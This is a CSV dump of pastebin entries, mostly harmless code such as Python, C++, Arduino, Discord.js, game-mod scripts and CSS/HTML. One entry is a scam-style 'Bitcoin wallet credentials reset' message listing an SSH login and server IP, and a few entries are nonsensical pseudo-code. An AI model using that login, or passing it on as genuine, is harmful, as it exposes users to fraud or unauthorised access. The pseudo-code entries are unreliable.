id,title,username,language,date,content
cb4QS035,Untitled,xX_yodaplayzXx,Python,Friday 16th of June 2023 01:01:41 PM CDT,"import random,time
list_of_names = ['Amelia', 'Olivia', 'Isla', 'Emily', 'Alexey', 'Poppy', 'Ava', 'Isabella', 'Jessica', 'Marcus', 'Lily', 'Sophie', 'Grace', 'Vsevolod', 'Sophia', 'Mia', 'Evie', 'Ruby', 'Celim', 'Sumir', 'Ella', 'Scarlett', 'Ruben', 'Isabelle', 'Chloe', 'Cherlin', 'Sienna', 'Masha', 'Freya', 'Phoebe', 'Charlotte', 'Daisy', 'Alice', 'Florence', 'Eva', 'Sofia', 'Millie', 'Lucy', 'Evelyn', 'Elsie', 'Rosie', 'Imogen', 'Lola', 'Matilda', 'Elizabeth', 'Layla', 'Alasdair','Holly', 'Lilly', 'Molly', 'Erin', 'Ellie', 'Maisie', 'Maya', 'Abigail', 'Eliza', 'Georgia', 'Jasmine', 'Esme', 'Willow', 'Leanne', 'Bella', 'Annabelle', 'Keemiya', 'Ivy', 'Amber', 'Emilia', 'Emma', 'Summer', 'Hannah', 'Eleanor', 'Harriet', 'Rose', 'Amelie', 'Lexi', 'Megan', 'Gracie', 'Zara', 'Nuha', 'John', 'Lacey', 'Martha', 'Anna', 'Violet', 'Darcey', 'Maria', 'Maryam', 'Brooke', 'Aisha', 'Katie', 'Leah', 'Heinrich', 'Nour', 'Thea', 'Darcie', 'Hollie', 'Amy', 'Alexandra', 'Stephen', 'Jonathan', 'Penny', 'Mollie', 'Heidi', 'Lottie', 'Bethany', 'Francesca', 'Faith', 'Harper', 'Nancy', 'Beatrice', 'Isabel', 'Juliette', 'Darcy', 'Lydia', 'Sarah', 'Sara', 'Julia', 'Victoria', 'Zoe', 'Robyn', 'Oliver', 'Jack', 'Harry', 'Jacob', 'Charlie', 'Thomas', 'Annabel', 'George', 'Oscar', 'James', 'Ian', 'William', 'Noah', 'Alfie', 'Joshua', 'Yuvraj', 'Muhammad', 'Leo', 'Archie', 'Ethan', 'Joseph', 'Arushi', 'Freddie', 'Samuel', 'Alexander', 'Logan', 'Daniel', 'Isaac', 'Max', 'Mohammed', 'Benjamin', 'Hugo', 'Mason', 'Lucas', 'Edward', 'Harrison', 'Jake', 'Neil', 'Dylan', 'Asher', 'Riley', 'Akash', 'Finley', 'Catherine', 'Theo', 'Muktarsi', 'Sebastian', 'Adam', 'Zachary', 'Arthur', 'Thomas', 'Alberto', 'Toby', 'Jayden', 'Luke', 'Harley', 'Lewis', 'Tyler', 'Harvey', 'Anusha', 'Matthew', 'David', 'Reuben', 'Alok', 'Michael', 'Elijah', 'Kian', 'Tom', 'Mohammad', 'Blake', 'Jean', 'Luca', 'Theodore', 'Stanley', 'Derin', 'Jenson', 'Nathan', 'Nicholas', 'Charles', 'Frankie', 'Constantin', 'Jude', 'Teddy', 'Eric', 'Viren', 'Louie', 'Louis', 'Ryan', 'Hugo', 'Bobby', 'Niamh', 'Anya', 'Elliott', 'Dexter', 'Khai', 'Hariesh', 'Henry', 'Ollie', 'Aron', 'Alex', 'Liam', 'Kai', 'Gabriel', 'Connor', 'Aaron', 'Afrah', 'Frederick', 'Callum', 'Lorcan', 'Elliot', 'Albert', 'Leon', 'Ronnie', 'Rory', 'Jamie', 'Austin', 'Seth', 'Ibrahim', 'Mei', 'Owen', 'Caleb', 'Yousuf', 'Ellis', 'Sonny', 'Devyn', 'Robert', 'Joey', 'Felix', 'Finlay', 'Rossa', 'Ekraj', 'Jackson', 'Jimi', 'Meera', 'Rafi', 'Salahdeen', 'Guido', 'Tanya', 'Karlis']


new_list = []
max = 0
print(""The highest was..."")
time.sleep(1)

for loop in list_of_names:                   # Words with the highest number of letters
  if len(loop)> max:
    max = len(loop)                                   
    new_list.append(loop)

print(new_list[-1])
print(""This has "" + str(max)+ "" letters"")
print("""")
time.sleep(0.5)
other_new_list = []
print(""The lowest was..."")
time.sleep(1)
for loop in list_of_names:                   # Words with the lowest number of letters
  if len(loop)< max:
    max = len(loop)
    new_list.append(loop)

print(new_list[-1])
print(""This has "" + str(max)+ "" letters"")


                                          # Names spelt the same backwards








"
MwFpEcUN,something,theguild42,C++,Friday 16th of June 2023 12:50:43 PM CDT,"#include <iostream>
using namespace std;

#include ""wp.h""
int main(){
    wp_init();
    cout << ""WirePlumber Initalized!"" << endl;
    return 0;
}"
EH6mgyee,kb_act.lst,ht777,C,Friday 16th of June 2023 12:48:09 PM CDT,"""blank""				""==========================""
""blank""				""Addon""
""blank""				""==========================""

""KickingComm""        ""Patada""
""+smh_menu""          ""Menu de tercera persona""
""dropweapon""         ""Lanzar arma""
""thirdperson_toggle"" ""Activar/desactivar tercera persona""
""rm_ragdolize""       ""Dejarse caer"""
WnCByA9n,BTC Wallet Credentials have been reset,abbredescr_91,GetText,Friday 16th of June 2023 12:35:58 PM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
avsetabn:Ztdz4V on 45.9.148.244(SSH)
Regards"
HvnNeqQt,"Baixar video Youtube (sem janela, apenas terminal)",MizunoBrasil,Python,Friday 16th of June 2023 12:15:46 PM CDT,"#Baixar video Youtube (sem janela, apenas terminal)

from pytube import YouTube

# Solicita ao usuário que insira o URL do vídeo
url = input(""Insira o URL do vídeo do YouTube: "")

try:
    # Cria uma instância do objeto YouTube
    video = YouTube(url)

    # Filtra a melhor resolução disponível
    stream = video.streams.get_highest_resolution()

    # Baixa o vídeo
    print(""Baixando o vídeo..."")
    stream.download()
    print(""Download concluído!"")

except Exception as e:
    print(""Ocorreu um erro durante o download:"", str(e))
"
yx8VZhHH,Example,ClownProgrammer,Java,Friday 16th of June 2023 12:14:00 PM CDT,"public static List<String> splitText(String text, int maxSizeLine) {
        ArrayList<String> result = new ArrayList<>();

        Pattern pattern = Pattern.compile(""(\\S{0,""+maxSizeLine+""}\\s?)"");
        Matcher matcher = pattern.matcher(text);
        StringBuilder testString = new StringBuilder();
        while (matcher.find()) {
            if (testString.length() < maxSizeLine) {
                testString.append(matcher.group());
            }
            else {
                result.add(testString.toString());
                testString = new StringBuilder(matcher.group());
            }
        }
        result.add(testString.toString());

        return result;
    }"
51wgg8ac,upload.js Discord.js v14 JS Command,LightAndy197,JavaScript,Friday 16th of June 2023 12:13:23 PM CDT,"/**
 * ❗Dependencies (npm):
 *   - discord.js (obviously);
 *   - shefin-tinyurl (for link shortening);
 *   - colors (for coloured error log);
 *
 * ❗You can use this to install them quick: `npm i discord.js shefin-tinyurl colors`
 */

const { SlashCommandBuilder, EmbedBuilder } = require(""discord.js"");
const TinyURL = require(""shefin-tinyurl"");
require(""colors"");

module.exports = {
  data: new SlashCommandBuilder()
    .setName(""upload"")
    .setDescription(""Upload a file and receive a shortened URL link."")
    .addAttachmentOption((option) =>
      option
        .setName(""file"")
        .setDescription(""The file to upload."")
        .setRequired(true)
    )
    .addBooleanOption((option) =>
      option
        .setName(""shorten-link"")
        .setDescription(""True = Shortened Link; False = Old, long link"")
        .setRequired(false)
    )
    .addBooleanOption((option) =>
      option
        .setName(""public"")
        .setDescription(
          ""True = Public Message; False = Private Message (ephemeral)""
        )
        .setRequired(false)
    ),
  async execute(interaction) {
    const { options, user } = interaction;

    const file = options.getAttachment(""file"");
    const smallFile = await TinyURL.shorten(file.url);
    const shorten = options.getBoolean(""shorten-link"");
    const public = options.getBoolean(""public"");

    //* Embeds
    const embed = new EmbedBuilder()
      .setColor(0x00ac60)
      .setAuthor({
        name: ""Upload complete!"",
        iconURL: ""https://i.imgur.com/W9GJJRK.jpg"",
      })
      .setFooter({
        text: `Requested by ${user.tag}`,
        iconURL: user.displayAvatarURL({ dynamic: true }),
      })
      .setTimestamp();
    const errEmbed = new EmbedBuilder()
      .setColor(""Red"")
      .setAuthor({
        name: ""Something went wrong..."",
        iconURL: ""https://i.imgur.com/k1x9dS3.png"",
      })
      .setDescription(
        ""Your file might be too large. Upload a smaller file and try again later. If the issue persists please contact the developer.""
      )
      .setTimestamp();

    try {
      if (shorten == false)
        embed.setDescription(
          `Here's a link to your uploaded file: ${file.url}`
        );
      else
        embed.setDescription(
          `Here's a shortened link to your uploaded file: ${smallFile}`
        );

      if (public == true) {
        return await interaction.reply({ embeds: [embed] });
      } else {
        return await interaction.reply({ embeds: [embed], ephemeral: true });
      }
    } catch (err) {
      console.log(""[UPLOAD ERROR]"".red, err);
      return await interaction.reply({ embeds: [errEmbed], ephemeral: true });
    }
  },
};

/**
 * ❗Code by LightAndy#0001 (Actual Discord tag as 06.16.2023) or @LightAndy (New possible Discord tag)
 * ❗I would like to have credits for the code please, if you want to use it
 */
"
KcjrdBAS,Railgun rails spawning in segments,Tomasm21,C++,Friday 16th of June 2023 11:31:18 AM CDT,"#library ""SW""
#include ""zcommon.acs""
#include ""zdaemon.acs""

Script 1024 (int lowang){

int i;
int LoWangTID;

if(lowang == 0){

    int x = 0;
    int y = 0;
    int z = 0;
	int xb, yb, zb;
	int railTID = 46000+Various_tags[9];
    Various_tags[9] = Various_tags[9] + 1;    
    if (Various_tags[9] > 999) Various_tags[9] = 0;
	
	thing_changetid(0, railTID);
 
    setactivatortotarget(0);  
	LoWangTID = activatorTID();

	for(i = 0; i < 32; i++){
		if(playerLoWangClone[i] == LoWangTID){
			break;
		}
	}
	
	setactorangle(railTID,getactorangle(0));
	
	xb = getactorx(railTID) + cos (getactorangle(0)-0.25) * 4;
	yb = getactory(railTID) + sin (getactorangle(0)-0.25) * 4;
	zb = getactorz(railTID);
	
    setactorposition(railTID, xb, yb, zb, 0);
	
	setactivator(railTID);
	for(int j = 0; j < 2; j++){
		activatorsound(""RAILGF2"",255);
	}

    int this = 0;
    while (thingcount(T_NONE,railTID) == 1)
    {
        x = getactorx(railTID);
        y = getactory(railTID);
        z = getactorz(railTID);
		
        if(this > 0){
			if(this == 1){
				spawnprojectile(0,""KeySwamp"",getactorangle(0)>>8,0,0,0,LoWangTID+i*5 + 34003);
				spawnprojectile(0,""FlameLarge"",getactorangle(railTID)>>8,64,0,0,LoWangTID+i*5 + 35003);
				Thing_SetTranslation (LoWangTID+i*5 + 34003, 192);
				spawnprojectile(0,""KeySwamp"",getactorangle(0)>>8,0,0,0,LoWangTID+i*5 + 34004);
				spawnprojectile(0,""FlameLarge"",getactorangle(railTID)>>8,64,0,0,LoWangTID+i*5 + 35004);
				Thing_SetTranslation (LoWangTID+i*5 + 34004, 191);
				spawnprojectile(0,""KeySwamp"",getactorangle(0)>>8,0,0,0,LoWangTID+i*5 + 34005);
				spawnprojectile(0,""FlameLarge"",getactorangle(railTID)>>8,64,0,0,LoWangTID+i*5 + 35005);
				Thing_SetTranslation (LoWangTID+i*5 + 34005, 190);
			}
			spawnprojectile(0,""KeySwamp"",getactorangle(0)>>8,0,0,0,LoWangTID+i*5 + 34001);
			spawnprojectile(0,""FlameLarge"",getactorangle(railTID)>>8,64,0,0,LoWangTID+i*5 + 35001);
 			spawnprojectile(0,""KeySwamp"",getactorangle(0)>>8,0,0,0,LoWangTID+i*5 + 34002);
 			spawnprojectile(0,""FlameLarge"",getactorangle(railTID)>>8,64,0,0,LoWangTID+i*5 + 35002);
		}
		
        spawnprojectile(0,""KeySwamp"",getactorangle(0)>>8,0,0,0,LoWangTID+i*5 + 34000);
        spawnprojectile(0,""FlameLarge"",getactorangle(railTID)>>8,64,0,0,LoWangTID+i*5 + 35000);
		Thing_SetTranslation (LoWangTID+i*5 + 34000, 192);
        setactorposition(LoWangTID+i*5 + 34000,x,y,z,0);
		setactorposition(LoWangTID+i*5 + 35000,x,y,z,0);
		thing_changetid(LoWangTID+i*5 + 34000, 0);
		thing_changetid(LoWangTID+i*5 + 35000, 0);
			
		if(this > 0){
			if(this == 1){
				// External prtitioning: m:n = 1:2
				x = (x-2*xb)/-1;
				y = (y-2*yb)/-1;
				z = (z-2*zb)/-1;
				setactorposition(LoWangTID+i*5 + 34003, x, y, z,0);
				setactorposition(LoWangTID+i*5 + 35003, x, y, z,0);
				thing_changetid(LoWangTID+i*5 + 34003, 0);
				thing_changetid(LoWangTID+i*5 + 35003, 0);
				
				x = getactorx(railTID);
			    y = getactory(railTID);
			    z = getactorz(railTID);
				
				// External prtitioning: m:n = 2:5
				x = (2*x-5*xb)/-3;
				y = (2*y-5*yb)/-3;
				z = (2*z-5*zb)/-3;
				setactorposition(LoWangTID+i*5 + 34004, x, y, z,0);
				setactorposition(LoWangTID+i*5 + 35004, x, y, z,0);
				thing_changetid(LoWangTID+i*5 + 34004, 0);
				thing_changetid(LoWangTID+i*5 + 35004, 0);
				
				x = getactorx(railTID);
				y = getactory(railTID);
				z = getactorz(railTID);
				
				// External prtitioning: m:n = 1:4
				x = (x-4*xb)/-3;
				y = (y-4*yb)/-3;
				z = (z-4*zb)/-3;
				setactorposition(LoWangTID+i*5 + 34005, x, y, z,0);
				setactorposition(LoWangTID+i*5 + 35005, x, y, z,0);
				thing_changetid(LoWangTID+i*5 + 34005, 0);
				thing_changetid(LoWangTID+i*5 + 35005, 0);
				
				x = getactorx(railTID);
				y = getactory(railTID);
				z = getactorz(railTID);
			}
			
			// m:n = 1:2
			x = (x+2*xb)/3;
			y = (y+2*yb)/3;
			z = (z+2*zb)/3;
			
			setactorposition(LoWangTID+i*5 + 34001, x, y, z,0);
			setactorposition(LoWangTID+i*5 + 35001, x, y, z,0);
			thing_changetid(LoWangTID+i*5 + 34001, 0);
			thing_changetid(LoWangTID+i*5 + 35001, 0);
			
			x = getactorx(railTID);
			y = getactory(railTID);
			z = getactorz(railTID);
	
			// m:n = 2:1
			x = (2*x + xb)/3;
			y = (2*y + yb)/3;
			z = (2*z + zb)/3;
			setactorposition(LoWangTID+i*5 + 34002, x, y, z,0);
			setactorposition(LoWangTID+i*5 + 35002, x, y, z,0);
			thing_changetid(LoWangTID+i*5 + 34002, 0);
			thing_changetid(LoWangTID+i*5 + 35002, 0);
		}
		
 		xb = getactorx(railTID); yb = getactory(railTID); zb = getactorz(railTID);
        delay(1);
		
		this++;
    }
}
//..."
U9zmW5gV,euphoria syntax,LockdateforGHS,Euphoria,Friday 16th of June 2023 11:29:59 AM CDT,"and by constant do else elsif end exit for function global if include not or procedure return then to type while with without xor abort and_bits append arctan atom c_func call c_proc call_func call_proc clear_screen close compare command_line cos date equal find find_from floor getc getenv gets get_key get_pixel integer length log machine_func machine_proc match match_from mem_copy mem_set not_bits object open or_bits peek peek4s peek4u pixel platform poke poke4 position power prepend print printf profile puts rand remainder repeat routine_id sequence sin sprintf sqrt system system_exec tan task_clock_stop task_clock_start task_create task_list task_schedule task_self task_status task_suspend task_yield time trace xor_bits
-- exist"
fEeL0dWn,GetText Syntax Highlighting Keywords,LockdateforGHS,GetText,Friday 16th of June 2023 11:24:15 AM CDT,"Hey everybody, after research i found out pastebin uses GeShi software to highlight. I went to the gettext.php file then looked at all the keywords heres all of them since like no one knows the syntax

# Comment

msgctxt
msgid_plural
msgstr
msgid
'' """" () {} [] 



heres one i thought existed :(

Msgbox"
9dVDWXKQ,gettext highlighting syntax,LockdateforGHS,GetText,Friday 16th of June 2023 11:19:09 AM CDT,"msgctxt 

msgstr

\\ h"
3eG574Uf,Cash Collecter.ns,LockdateforGHS,GetText,Friday 16th of June 2023 11:11:36 AM CDT,"# This is the script for a object that collects (illegal Collected game money) and an admin collects it
import object.inventory.title
import object.logic.data

# icct short for illegal cash collecting tool

object.title : (""illegal cash collecting tool"")
object.model : ("",04,11,84929,%11&55==draw33,09,65,04427,563;79,:6:002,83,28764-919%92"") # encode is large (drawn from ap)

start logic,
 object.logic(StartScript):
 
 if player.collectCash = cheatfound then
   icct.collectCash:logic
  label.showAmountOfCash();
 then collect = true
   orgin.(amount=0),
button.text = ""Collect Cash"",
 if buttonpressed then
   cash.collect();
   goToCashInv,
 end logic,
 
 # i made like 230,000,000 cash from this. (Still work in progress)"
1wyNKnr3,suite kit,LockdateforGHS,GetText,Friday 16th of June 2023 10:56:27 AM CDT,"# v2
#Suite of tools to get started. 
#including code editor (python, javascript, arduino, kotlin, swift, makefile) [API]
web_menu(), start(00, 26225),
app.title = ""Suite Kit""
  
  code-editor = fetch
  
  url.http(""https://raw.githubusercontent.com/capybb/Pastebin-data/main/editor.code%20%206.1""), # language idk
suite.tools(""

url.http(""https://raw.githubusercontent.com/capybb/Pastebin-data/main/suite-tools.ql"") # language codeql


# to lazy for all it. Encoded hah from random"
kmcc4Sq8,Untitled,GigaOrts,C#,Friday 16th of June 2023 10:50:30 AM CDT,"//Вместо этого
static void MovePlayer(char[,] map, ref int pacmanPositionX, ref int pacmanPositionY, ConsoleKeyInfo pressedKey, char border)
{
    switch (pressedKey.Key)
    {
        case ConsoleKey.LeftArrow:
            ChangePosition(map[pacmanPositionY, pacmanPositionX - 1], ref pacmanPositionX, false, border);
            break;

        case ConsoleKey.RightArrow:
            ChangePosition(map[pacmanPositionY, pacmanPositionX + 1], ref pacmanPositionX, true, border);
            break;

        case ConsoleKey.UpArrow:
            ChangePosition(map[pacmanPositionY - 1, pacmanPositionX], ref pacmanPositionY, false, border);
            break;

        case ConsoleKey.DownArrow:
            ChangePosition(map[pacmanPositionY + 1, pacmanPositionX], ref pacmanPositionY, true, border);
            break;
    }
}

//Сделайте вот это (Написал примерно, корректируйте под свой код, надеюсь помогло навести на мысли)
static void MovePlayer(char[,] map, ref int pacmanPositionX, ref int pacmanPositionY, ConsoleKeyInfo pressedKey, char border)
{
    switch (pressedKey.Key)
    {
        case ConsoleKey.LeftArrow:
			pacmanPositionX--;
            break;

        case ConsoleKey.RightArrow:
            pacmanPositionX++;
            break;

        case ConsoleKey.UpArrow:
            pacmanPositionY--;
            break;

        case ConsoleKey.DownArrow:
            pacmanPositionY++;
            break;
    }

	ChangePosition(map[pacmanPositionY, pacmanPositionX], ref pacmanPositionX, false, border);
}"
4PLaP3EY,ZUMO Code,TheProgrammer69,C++,Friday 16th of June 2023 10:41:51 AM CDT,"#include ""Accelerometer.h""
 
Accelerometer::Accelerometer() {}
Accelerometer::~Accelerometer() {}
 
void Accelerometer::sensorenInitialiseren() {
  /*!
   * \brief Initialiseert de sensoren en geeft een melding als dit niet lukt.
   *
   * Deze functie initialiseert de sensoren en geeft een melding als dit niet lukt.
   * Als de sensoren niet gedetecteerd worden, wordt de rode LED op de Zumo-robot
   * ingeschakeld en wordt er een bericht op de seriële monitor geprint.
   */
  Serial.begin(9600);
  Wire.begin();
  imu.init();
  if (!imu.init())
  {
    ledRed(1);
    while(1)
    {
      Serial.println((""De initialisatie van de sensoren is mislukt""));
      delay(100);
    }
    Serial.print(""Kaas"");
  }
  imu.enableDefault();
}
 
bool Accelerometer::brugKantelingDetecteren() {
  /*!
   * \brief Detecteert een kantelbrug op basis van de helling van de robot.
   *
   * Deze functie gebruikt de accelerometergegevens om de helling van de robot te detecteren.
   * Als de helling groter is dan een drempelwaarde, wordt aangenomen dat de robot een kantelbrug nadert.
   * Op basis van deze detectie kunt u de snelheid aanpassen, de rijrichting wijzigen of andere relevante acties ondernemen.
   */
 
  imu.readAcc();
  int acc_x = imu.a.x;
  int acc_z = imu.a.z;
 
  // Bereken de helling in graden
  float helling1 = atan2(acc_x, acc_z) * 180.0 / PI;
  delay(20);
  imu.readAcc();
  acc_x = imu.a.x;
  acc_z = imu.a.z;
 
  // Bereken de helling in graden
  float helling2 = atan2(acc_x, acc_z) * 180.0 / PI;
 
  float helling = (helling1 + helling2)/2;
  // Controleer of de helling groter is dan de drempelwaarde voor kantelbrug
  if ((helling) > kantelbrugDrempelwaarde) {
    // Voer de gewenste acties uit voor kantelbrug detectie
    Serial.println(""Hel op"");
    return true;
  }
  else{
    // Voer de gewenste acties uit voor kantelbrug detectie
    Serial.println(""Helling Af"");
    return false;
  }
}
 
 
void Accelerometer::snelheidsverschilBerekenen() {
  /*!
   * \brief Bereken de daadwerkelijke snelheid op basis van het verschil in acceleratie en tijd.
   *
   * Deze functie leest de waarde van de acceleratie op twee momenten en berekent de snelheid
   * op basis van de verandering in acceleratie en de opgegeven tijdsinterval (delta t). De snelheid
   * wordt bijgewerkt door de integratie van de veranderingen in acceleratie en geprint op de seriële monitor.
   */
 
  imu.readAcc();
  int acc_x_1 = imu.a.x;
  delay(400);   
  imu.readAcc();
  int acc_x_2 = imu.a.x;
  int delta_a = acc_x_2 - acc_x_1;
 
  float snelheid = beginsnelheid; // Beginsnelheid
 
  while (!(abs(delta_a) < drempelwaarde)) {
    imu.readAcc();
    int acc_x_prev = acc_x_2;
    acc_x_2 = imu.a.x;
    delta_a = acc_x_2 - acc_x_prev;
 
    // Voeg het teken van delta_a toe aan de snelheid
    if (delta_a > 0) {
      snelheid += delta_a * delta_t; // Verhoog de snelheid bij acceleratie
    } else if (delta_a < 0) {
      snelheid += delta_a * delta_t; // Verlaag de snelheid bij vertraging
    }
    Serial.println(snelheid);
    Serial.println(""snelheid="" + String(snelheid));
  }
}
 
 
void Accelerometer::botsingControleren() {
  /*!
   * \brief Geeft een melding als de snelheid plots naar 0 gaat.
   *
   * Deze functie geeft een melding als de snelheid plots naar 0 gaat, wat kan duiden op een
   * botsing of crash. Het bericht ""Ouch, dat deed pijn"" wordt geprint op de seriële monitor.
   */
  if (snelheid == 0){
    Serial.println(""Ouch, dat deed pijn"");
  }
}
 
void Accelerometer::controleerLinksRechtsBeweging() {
    /*!
    * \brief Controleert de links-rechtsbeweging van de Zumo-robot op basis van de acceleratiewaarden.
    *
    * Deze functie controleert de links-rechtsbeweging van de Zumo-robot op basis van de acceleratiewaarden.
    * Als de robot in de y-richting beweegt, wordt gecontroleerd op veranderingen in de x-richting en vice versa.
    * Pas de drempelwaarden aan om de gevoeligheid van de bewegingsdetectie aan te passen.
    */
    // Lees de acceleratiewaarden
    imu.readAcc();
    float accX = imu.a.x;
    float accY = imu.a.y;
 
    // Controleer de links-rechtsbeweging op basis van de acceleratie
    if (abs(accY) > drempelwaarde) {
        // Beweeg in de y-richting, controleer de x-richting
        if (accX > drempelwaarde) {
            // Beweeg naar rechts
            // Voer hier uw acties uit
            Serial.print(""Je beweegt naar rechts"");
        } else if (accX < -drempelwaarde) {
            // Beweeg naar links
            // Voer hier uw acties uit
            Serial.print(""Je beweegt naar links"");
        }
    } else if (abs(accX) > drempelwaarde) {
        // Beweeg in de x-richting, controleer de y-richting
        if (accY > drempelwaarde) {
            // Beweeg naar voren
            // Voer hier uw acties uit
            Serial.print(""Je beweegt naar rechts2"");
 
        } else if (accY < -drempelwaarde) {
            // Beweeg naar achteren
            // Voer hier uw acties uit
            Serial.print(""Je beweegt naar links2"");
 
        }
    }
    // Bewaar de huidige acceleratiewaarden voor de volgende iteratie
    vorigeAccX = accX;
    vorigeAccY = accY;
}"
bud3fufr,harvesting time and surface,sdfdsfdsfhhhh,C++,Friday 16th of June 2023 09:52:15 AM CDT,"#include <MD_Parola.h>
#include <MD_MAX72xx.h>
#include <SPI.h>
#include <Wire.h>
#include <DS1307.h>
#include <EasyButton.h>

#define HARDWARE_TYPE MD_MAX72XX::FC16_HW
//#define HARDWARE_TYPE MD_MAX72XX::GENERIC_HW
 
#define MAX_DEVICES 4

#define surfaceCS 8
#define timeCS 9
EasyButton b1(12);
EasyButton b2(3);
EasyButton s1(4);
EasyButton s2(5);
EasyButton b3(6);
EasyButton b4(A2, 35, 1, 0);
DS1307 clock;
MD_Parola surfaceDisplay = MD_Parola(HARDWARE_TYPE, surfaceCS, MAX_DEVICES);
MD_Parola timeDisplay = MD_Parola(HARDWARE_TYPE, timeCS, MAX_DEVICES);

//wejscia według rysunku/schematu
/*#define s1 2 //przycisk start/stop
#define s2 3 //przycisk zerowania
#define b1 4 //czujnik indukcyjny po jego zadziałaniu umożliwia dodawanie powierzchni
#define b2 5 // czujnik indukcyjny wykrywa obrót koła i dodaje powierzchnie
#define b3 6 //czujnik indukcyjny po jego zadziałaniu nblokuje dodawanie powierzchni
#define b4 10 //czujnik podniesienia hederu*/
#define h1 A0 //dioda zielona, swieci - liczy
#define h2 A1// dioda czerwona - swieci - nie liczy
bool programState = 0;// 0 - nie liczy, 1 - liczy obsługiwane przez przycisk, zatrzymuje i czas i powierzchnie
bool surfaceCount = 0; //jak wyzej, obsługiwane przez przycisk i czujniki, zatrzymuje tylko powierzchnie
float surface = 0; //powierzchnia w hektarach
int hours = 0;
int minutes = 0;
const float cuttingWidth = 0.7;
const float wheelRadius = 4.15;
//bool hh1 = 1;
bool fullTurn = 1;
//unsigned long h1Time = 0;

void setup() {
  // put your setup code here, to run once:
  Serial.begin(9600);
  
  clock.begin();
  surfaceDisplay.begin();
  clock.fillByYMD(0,0,0);//Jan 19,2013
	clock.fillByHMS(0,0,0);//15:28 30""
	clock.fillDayOfWeek(SAT);//Saturday
	clock.setTime();//write time to the RTC chip
  clock.stopClock();
  surfaceDisplay.setIntensity(15);
  surfaceDisplay.displayClear();
  surfaceDisplay.setTextAlignment(PA_CENTER);
  surfaceDisplay.print(""##############"");
  timeDisplay.begin();
  timeDisplay.setIntensity(15);
  timeDisplay.displayClear();
  timeDisplay.setTextAlignment(PA_CENTER);
  timeDisplay.print(""##################"");
  s1.begin();
  s2.begin();
  b1.begin();
  b2.begin();
  b3.begin();
  b4.begin();

  /*pinMode(s1, INPUT_PULLUP);
  pinMode(s2, INPUT_PULLUP);
  pinMode(b1, INPUT_PULLUP);
  pinMode(b2, INPUT_PULLUP);
  pinMode(b3, INPUT_PULLUP);
  pinMode(b4, INPUT_PULLUP);*/
  pinMode(h1, OUTPUT);
  pinMode(h2, OUTPUT);
  //digitalWrite(h1, 1);
}

void loop() {
  s1.read();
  s2.read();
  b1.read();
  b2.read();
  b3.read();
  b4.read();
  if(s1.wasPressed())
  {
    programState = !programState;
    if(programState)
    {
      clock.startClock();
    }
    if(!programState)
    {
      clock.stopClock();
    }
  }  //wcisnięcie przycisku zmienia stan na przeciwny
   s2.onPressedFor(3000, reset);
  if(programState)
  {
    //clock.startClock();
    digitalWrite(h1, 1);
    if(b1.wasPressed() && fullTurn)
    {
      surfaceCount = 1;
      fullTurn = 0;
    }
    if(b4.isPressed() || b3.wasPressed())
    {
      fullTurn = b3.wasPressed();
      surfaceCount = 0;
    }
    if(b2.wasPressed() && surfaceCount)
    {
      surface += cuttingWidth * 2 * 3.14 * wheelRadius * 0.0001;
      surfaceCount = 0;
      fullTurn = 0;
      //surfaceDisplay.displayClear();
      //surfaceDisplay.print(surface);
    }
    clock.getTime();
    minutes = clock.minute;
    hours = clock.hour;
  }
  //surfaceDisplay.print(surface);
  displayField();
  displayTime();
  digitalWrite(h1, programState);
  digitalWrite(h2, !programState);
}

void displayField()
{
  int realPart;
  int fractionPart;
  int fractionPartTens;
  int fractionPartHundreds;
  float field = surface;
  field += 0.005;
  field *= 100;
  int fieldInt = field;
  fractionPart = fieldInt % 100;
  fractionPartHundreds = fractionPart % 10;
  fractionPart *= 0.1;
  fractionPartTens = fractionPart % 10;
  realPart = fieldInt / 100;
  String realPartDisplay = String(realPart);
  String fractionPartTensDisplay = String(fractionPartTens);
  String fractionPartHundredsDisplay = String(fractionPartHundreds);
  surfaceDisplay.print(realPartDisplay + ""."" + fractionPartTensDisplay + fractionPartHundredsDisplay);
  //Serial.println(realPartDisplay + "","" + fractionPartDisplay);
}

void displayTime()
{
  int minuteS = minutes;
  int minutesOnes = minuteS % 10;
  minuteS *= 0.1;
  int minutesTens = minuteS % 10;
  String minutesOnesDisplay = String(minutesOnes);
  String minutesTensDisplay = String(minutesTens);
  String hoursDisplay = String(hours);
  timeDisplay.print(hoursDisplay + "":"" + minutesTensDisplay + minutesOnesDisplay);
  //Serial.println(hoursDisplay + "":"" + minutesDisplay);
}
void reset()
{
  if(!programState)
  {
  surface = 0;
  hours = 0;
  minutes = 0;
  clock.fillByHMS(0,0,0);
  clock.setTime();
  }
}
"
mQ8veTxh,Untitled,Clamator,CSS,Friday 16th of June 2023 09:43:40 AM CDT,".breadcrumbs {
  @media (max-width: 801px) {
    @apply hidden;
  }
}

.breadcrumbs-small-screen {
  @apply flex flex-row gap-8 flex-nowrap text-s text-text items-center;
  @media (min-width: 802px) {
    @apply hidden;
  }
  @media screen and (max-width: 480px) {
    @apply w-3/4;
  }
}

.breadcrumbs-small-screen-image {
  @apply w-20 h-20 block;
  background: url(""../../img/card-fullpage/breadcrumb-home.svg"") no-repeat center;
  background-size: contain;
}

.breadcrumbs-small-screen-dots {
  @apply relative;
}

.breadcrumbs-arrow {
  @apply absolute h-12 w-32 hidden;
  left: -1.1rem;
  background: url(""../../img/card-fullpage/bread-arrow.svg"") no-repeat center;
  background-size: contain;
}

.breadcrumbs-path-hidden-text {
  @apply absolute hidden bg-white z-10 p-16 flex flex-col gap-8;
  border: 1px solid black;
  width: 20rem;
  top: 2.9rem;
  left: -1.2rem;
}

.breadcrumbs-small-screen-dots:hover
.breadcrumbs-arrow {
  @apply block;
}

.breadcrumbs-small-screen-dots:hover
.breadcrumbs-path-hidden-text {
  @apply block;
}


.breadcrumbs-icons {
  @apply flex flex-row gap-16;
  @media (min-width: 801px) {
    @apply hidden;
  }
}

@media screen and (max-width: 480px) {
  .breadcrumbs-small-screen-path {
    @apply overflow-hidden whitespace-nowrap;
    text-overflow: ellipsis;
    max-width: calc(80%);
  }
}"
s7BwrgTZ,Untitled,Clamator,HTML,Friday 16th of June 2023 09:42:17 AM CDT," <div class=""flex justify-between px-24 items-center"">
        <p class=""breadcrumbs p-24"">
          <a href=""#"">Главная </a><span>/</span>
          <a href=""#"">Книги </a><span>/</span>
          <a href=""#"">Все книги </a><span>/</span>
          <a href=""#"">Художественная литература </a><span>/</span>
          <a href=""#"">Русские народные сказки</a><span>/</span>
          <a href=""#"">Безработный Дед Мороз. Волшебный круговорот</a>
        </p>
